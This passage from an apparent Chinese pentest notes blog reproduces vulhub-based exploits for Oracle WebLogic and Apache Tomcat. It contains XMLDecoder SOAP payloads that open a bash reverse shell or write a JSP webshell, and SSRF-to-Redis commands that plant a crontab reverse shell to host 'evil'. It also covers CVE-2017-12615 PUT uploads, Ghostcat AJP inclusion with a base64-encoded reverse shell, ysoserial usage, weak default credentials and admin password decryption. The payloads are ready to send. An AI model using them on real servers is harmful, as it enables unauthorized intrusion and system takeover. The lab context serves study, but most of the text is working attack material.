<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/21 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>写入webshell（访问：<a target="_blank" rel="noopener" href="http://your-ip:7001/bea_wls_internal/test.jsp%EF%BC%89">http://your-ip:7001/bea_wls_internal/test.jsp）</a>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 638</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">    &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; </span><br><span class="line">    &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;</span><br><span class="line">    &lt;void method=&quot;println&quot;&gt;&lt;string&gt;</span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">&lt;% out.print(&quot;test&quot;); %&gt;</span><br><span class="line">    ]]&gt;</span><br><span class="line">    &lt;/string&gt;</span><br><span class="line">    &lt;/void&gt;</span><br><span class="line">    &lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">    &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;</span><br><span class="line">    &lt;/work:WorkContext&gt;</span><br><span class="line">    &lt;/soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/43458/">https://www.exploit-db.com/exploits/43458/</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/487/">https://paper.seebug.org/487/</a></li>
</ul>
<h3 id="2-Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#2-Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="2. Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>2. Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h3><p><strong>漏洞描述</strong></p>
<p>Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令</p>
<p><strong>漏洞复现</strong></p>
<p>使用vulhub搭建环境，执行如下命令启动Weblogic 10.3.6.0：等待环境启动，访问<a target="_blank" rel="noopener" href="http://your-ip:7001/console%EF%BC%8C%E5%88%9D%E5%A7%8B%E5%8C%96%E6%95%B4%E4%B8%AA%E7%8E%AF%E5%A2%83">http://your-ip:7001/console，初始化整个环境</a></p>
<p>首先下载ysoserial，并启动一个JRMP Server：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</span><br></pre></td></tr></table></figure>

<p>然后，使用<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44553">exploit.py</a>脚本，向目标Weblogic（<a href="http://your-ip:7001）发送数据包v">http://your-ip:7001）发送数据包v</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</span><br><span class="line"></span><br><span class="line">// [victim ip]和[victim port]是目标weblogic的IP和端口，[path to ysoserial]是本地ysoserial的路径，[JRMPListener ip]和[JRMPListener port]第一步中启动JRMP Server的IP地址和端口。[JRMPClient]是执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2</span><br></pre></td></tr></table></figure>

<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html">http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html</a></li>
<li><a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA">http://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</a></li>
</ul>
<h3 id="3-Weblogic-SSRF漏洞"><a href="#3-Weblogic-SSRF漏洞" class="headerlink" title="3. Weblogic SSRF漏洞"></a>3. Weblogic SSRF漏洞</h3><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件</p>
<p><strong>漏洞利用</strong></p>
<p>使用vulhub搭建环境，访问<a target="_blank" rel="noopener" href="http://your-ip:7001/uddiexplorer/%EF%BC%8C%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E5%8D%B3%E5%8F%AF%E6%9F%A5%E7%9C%8Buddiexplorer%E5%BA%94%E7%94%A8">http://your-ip:7001/uddiexplorer/，无需登录即可查看uddiexplorer应用</a></p>
<p><strong>SSRF漏洞测试</strong></p>
<p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code>，我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1:80</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>可访问的端口将会得到错误，一般是返回status code，如果访问的非http协议，则会返回<code>did not have a valid SOAP content-type</code></p>
<p>修改为一个不存在的端口，将会返回<code>could not connect over HTTP to server</code>，通过错误的不同，即可探测内网状态</p>
<p><strong>注入HTTP头，利用Redis反弹shell</strong></p>
<p>Weblogic的SSRF虽然是一个”GET”请求，但是可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就可以通过该SSRF攻击内网中的redis服务器</p>
<p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.18.0.2:6379可以连通</p>
<p>发送三条redis命令，将弹shell脚本写入&#x2F;etc&#x2F;crontab：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#x27;sh -i &gt;&amp; /dev/tcp/evil/21 0&gt;&amp;1&#x27;\n\n\n\n&quot;</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>进行url编码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#x27;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261&#x27;%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave</span><br><span class="line"></span><br><span class="line">// 换行符是&quot;\r\n&quot;，也就是&quot;%0D%0A&quot;</span><br></pre></td></tr></table></figure>

<p>将url编码后的字符串放在ssrf的域名后面，发送如下payload，即可成功反弹shell:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<h3 id="4-Weblogic-常规渗透"><a href="#4-Weblogic-常规渗透" class="headerlink" title="4. Weblogic 常规渗透"></a>4. Weblogic 常规渗透</h3><p>模拟一个真实的weblogic环境，其后台存在一个弱口令，并且前台存在任意文件读取漏洞。分别通过这两种漏洞，模拟对weblogic场景的渗透</p>
<p><strong>弱口令</strong></p>
<p>环境启动后，访问<a target="_blank" rel="noopener" href="http://your-ip:7001/console%EF%BC%8C%E5%8D%B3%E4%B8%BAweblogic%E5%90%8E%E5%8F%B0%E3%80%82">http://your-ip:7001/console，即为weblogic后台。</a></p>
<p>本环境存在弱口令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weblogic</span><br><span class="line">Oracle@123</span><br></pre></td></tr></table></figure>

<p>weblogic常用弱口令： <a target="_blank" rel="noopener" href="http://cirt.net/passwords?criteria=weblogic">http://cirt.net/passwords?criteria=weblogic</a></p>
<p><strong>任意文件读取漏洞</strong></p>
<p>假设不存在弱口令，可通过任意文件下载漏洞利用，访问<code>http://your-ip:7001/hello/file.jsp?path=/etc/passwd</code> 可成功读取passwd文件</p>
<ol>
<li>读取后台用户密文与密钥文件</li>
</ol>
<p>weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为.&#x2F;security&#x2F;SerializedSystemIni.dat和.&#x2F;config&#x2F;config.xml（基于当前目录&#x2F;root&#x2F;Oracle&#x2F;Middleware&#x2F;user_projects&#x2F;domains&#x2F;base_domain）。</p>
<p>SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件</p>
<p>config.xml是base_domain的全局配置文件，找到其中的<code>&lt;node-manager-password-encrypted&gt;</code>的值，即为加密后的管理员密码</p>
<ol start="2">
<li>解密密文</li>
</ol>
<p>然后使用本环境的decrypt目录下的weblogic_decrypt.jar，解密密文</p>
<ol start="3">
<li>后台上传webshell</li>
</ol>
<p>获取到管理员密码后，登录后台。点击左侧的部署，可见一个应用列表</p>
<p>点击安装，选择”上载文件”</p>
<p>上传war包。注意平时tomcat用的war包不一定能够成功，可以将你的webshell放到本项目的web&#x2F;hello.war这个压缩包中，再上传。上传成功后点下一步</p>
<p>填写应用名称，继续一直下一步，最后点完成。</p>
<p>应用目录在war包中WEB-INF&#x2F;weblogic.xml里指定（因为本测试环境已经使用了&#x2F;hello这个目录，所以要在本测试环境下部署shell，需要修改这个目录，比如修改成&#x2F;jspspy），成功获取webshell</p>
<p>refer: <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/weblogic/weak_password/README.md">https://github.com/vulhub/vulhub/blob/master/weblogic/weak_password/README.md</a></p>
<h2 id="0x06-Apache-Tomcat"><a href="#0x06-Apache-Tomcat" class="headerlink" title="0x06 Apache Tomcat"></a>0x06 Apache Tomcat</h2><h3 id="1-Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#1-Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="1. Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>1. Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h3><p><strong>漏洞描述</strong></p>
<p>Apache Tomcat 7.0.0到7.0.79版本中存在远程代码执行漏洞，当Tomcat运行在Windows主机上，且启用了 HTTP PUT 请求方法时，攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的JSP文件，文件中的代码被服务器执行</p>
<p><strong>漏洞原理</strong></p>
<p>漏洞本质Tomcat配置了可写（readonly&#x3D;false），导致我们可以往服务器写文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;default&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;debug&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;0&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;listings&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure>

<p>虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但使用一些文件系统的特性（如Linux下可用&#x2F;）来绕过限制</p>
<p><strong>环境搭建</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>运行完成后访问 <a target="_blank" rel="noopener" href="http://your-ip:8080/">http://your-ip:8080</a> 即可看到Tomcat的Example页面</p>
<p><strong>漏洞利用</strong></p>
<p>直接发送以下数据包即可在Web根目录写入shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>

<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/breaktoprotect/CVE-2017-12615">https://github.com/breaktoprotect/CVE-2017-12615</a></li>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/42953">https://www.exploit-db.com/exploits/42953</a></li>
</ul>
<h3 id="2-Apache-Tomcat-AJP-文件读取与包含漏洞-CVE-2020-1938"><a href="#2-Apache-Tomcat-AJP-文件读取与包含漏洞-CVE-2020-1938" class="headerlink" title="2. Apache Tomcat AJP 文件读取与包含漏洞 (CVE-2020-1938)"></a>2. Apache Tomcat AJP 文件读取与包含漏洞 (CVE-2020-1938)</h3><p><strong>漏洞描述</strong></p>
<p>默认情况下，Apache Tomcat会开启AJP连接器，方便与其他Web服务器通过AJP协议进行交互。但Apache Tomcat在AJP协议的实现上存在漏洞，导致攻击者可以通过发送恶意的AJP请求，可以读取或者包含Web应用根目录下的任意文件，如果存在文件上传功能，将可以导致任意代码执行。漏洞利用AJP服务端口实现攻击，未开启AJP服务对外不受漏洞影响（tomcat默认将AJP服务开启并绑定至0.0.0.0）</p>
<p><strong>漏洞利用</strong></p>
<p>通过vulhub搭建环境，启动一个Tomcat 9.0.30：环境启动后，访问 <a target="_blank" rel="noopener" href="http://your-ip:8080/">http://your-ip:8080</a> 即可查看tomcat默认页面，此时通过AJP协议的8009端口亦可访问Tomcat</p>
<p>1）任意文件读取</p>
<p>工具：<a target="_blank" rel="noopener" href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p>
<p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#python CNVD-2020-10487-Tomcat-Ajp-lfi.py &lt;目标ip&gt; -p &lt;ajp端口&gt; -f &lt;读取文件&gt;</span><br><span class="line">python CNVD-2020-10487-Tomcat-Ajp-lfi.py target_host -p 8009 -f WEB-INF/web.xml</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>文件包含</li>
</ol>
<p>本地包含的条件是需要目标web应用上有一个上传点，能上传txt或jpg等文件，才能进行文件包含的利用。在这用vulhub搭建环境，所以直接进入docker容器创建txt文件进行文件包含的利用</p>
<p>工具：<a target="_blank" rel="noopener" href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p>
<p>进入docker容器，在&#x2F;webapps&#x2F;ROOT&#x2F;目录下添加ping.txt文件，内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ping.txt</span><br><span class="line">&lt;%Runtime.getRuntime().exec(&quot;ping -c 4 `whoami`.name.ceye.cn&quot;);%&gt;</span><br></pre></td></tr></table></figure>

<p>利用poc进行文件包含执行漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://192.168.234.138 8009 /ping.txt eval</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>反弹shell</li>
</ol>
<p>反弹shell base64加密：<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<p>将文件命名为shell.txt上传服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzNC4xMjgvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);%&gt;</span><br></pre></td></tr></table></figure>

<p>利用ajpShooter.py脚本执行文件包含漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://target_host 8009 /cmd.txt eval</span><br></pre></td></tr></table></figure>

<p>监听端口，成功反弹shell</p>
<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://tomcat.apache.org/security.html">https://tomcat.apache.org/security.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.chaitin.cn/zh/ghostcat">https://www.chaitin.cn/zh/ghostcat</a></li>
</ul>
<h3 id="3-Tomcat7-弱口令-amp-amp-后台getshell漏洞"><a href="#3-Tomcat7-弱口令-amp-amp-后台getshell漏洞" class="headerlink" title="3. Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞"></a>3. Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</h3><p><strong>环境说明</strong></p>
<p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p>
<p>Tomcat7+权限分为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">manager（后台管理）</span><br><span class="line">manager-gui 拥有html页面权限</span><br><span class="line">manager-status 拥有查看status的权限</span><br><span class="line">manager-script 拥有text接口的权限，和status权限</span><br><span class="line">manager-jmx 拥有jmx权限，和status权限</span><br><span class="line">host-manager（虚拟主机管理）</span><br><span class="line">admin-gui 拥有html页面权限</span><br><span class="line">admin-script 拥有text接口权限</span><br></pre></td></tr></table></figure>

<p>在conf&#x2F;tomcat-users.xml文件中配置用户的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;</span><br><span class="line">              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span><br><span class="line">              version=&quot;1.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;manager-script&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;manager-jmx&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;manager-status&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="line">    &lt;role rolename=&quot;admin-script&quot;/&gt;</span><br><span class="line">    &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; /&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure>

<p>可见，用户tomcat拥有上述所有权限，密码是tomcat。正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。</p>
<p><strong>漏洞测试</strong></p>
<p>使用vulhub搭建环境，打开tomcat管理页面 <a target="_blank" rel="noopener" href="http://your-ip:8080/manager/html%EF%BC%8C%E8%BE%93%E5%85%A5%E5%BC%B1%E5%AF%86%E7%A0%81tomcat:tomcat%EF%BC%8C%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE%E5%90%8E%E5%8F%B0%EF%BC%9B%E4%B8%8A%E4%BC%A0war%E5%8C%85%E5%8D%B3%E5%8F%AF%E7%9B%B4%E6%8E%A5getshell">http://your-ip:8080/manager/html，输入弱密码tomcat:tomcat，即可访问后台；上传war包即可直接getshell</a></p>
<h2 id="0x07-FasterXML-Jackson"><a href="#0x07-FasterXML-Jackson" class="headerlink" title="0x07 FasterXML Jackson"></a>0x07 FasterXML Jackson</h2><h3 id="Jackson-databind-反序列化漏洞（CVE-2017-7525）"><a href="#Jackson-databind-反序列化漏洞（CVE-2017-7525）" class="headerlink" title="Jackson-databind 反序列化漏洞（CVE-2017-7525）"></a>Jackson-databind 反序列化漏洞（CVE-2017-7525）</h3><p>Jackson-databind 支持 Polymorphic Deserialization 特性（默认情况下不开启），当 json 字符串转换的 Target class 中有 polymorph fields，即字段类型为接口、抽象类或 Object 类型时，攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 TemplatesImpl，可以实现任意代码执行</p>
<p><strong>漏洞利用条件</strong></p>
